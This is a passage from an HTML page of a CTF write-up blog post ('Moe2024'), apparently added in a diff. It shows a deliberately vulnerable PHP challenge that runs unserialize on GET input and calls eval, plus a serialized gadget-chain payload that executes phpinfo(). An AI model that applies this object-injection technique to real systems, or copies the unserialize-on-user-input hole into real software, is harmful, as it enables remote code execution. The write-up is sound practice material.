class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+        </div>
+      </div>
+    </div>
+
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-90469042" role="button" aria-expanded="false" aria-controls="collapse-90469042">
+        <div class="fold-arrow">▶</div>payload
+      </div>
+      <div class="fold-collapse collapse" id="collapse-90469042">
+        <div class="fold-content">
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span>  <span class="hljs-variable">$payl0ad</span>;<br>	<span class="hljs-keyword">public</span>  <span class="hljs-variable">$what</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;payl0ad = <span class="hljs-string">&#x27;0&#x27;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;what = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class001</span>();<br>	&#125;<br>&#125;	<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;payl0ad = <span class="hljs-string">&#x27;dangerous&#x27;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class002</span>();<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$sec</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;sec = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class003</span>();<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;mystr = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class000</span>();<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;	<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+        </div>
+      </div>
+    </div>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/dong.github/categories/Practice/" class="category-chain-item">Practice</a>
+  
+  
+    <span>></span>
+    
+  <a href="/dong.github/categories/Practice/CTF%E8%B5%9B%E4%BA%8B/" class="category-chain-item">CTF赛事</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/dong.github/tags/Web/" class="print-no-link">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Moe2024</div>
+      <div>https://cmoments.github.io/dong.github/2024/09/13/Moe2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Dong</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>September 13, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/dong.github/2024/09/16/D-midautumn2024/" title="2024中秋节忏悔录">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024中秋节忏悔录</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/dong.github/2024/09/13/Practicetools/" title="Practicetools">
+                        <span class="hidden-mobile">Practicetools</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/dong.github/js/events.js" ></script>
+<script  src="/dong.github/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/dong.github/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/dong.github/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/dong.github/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
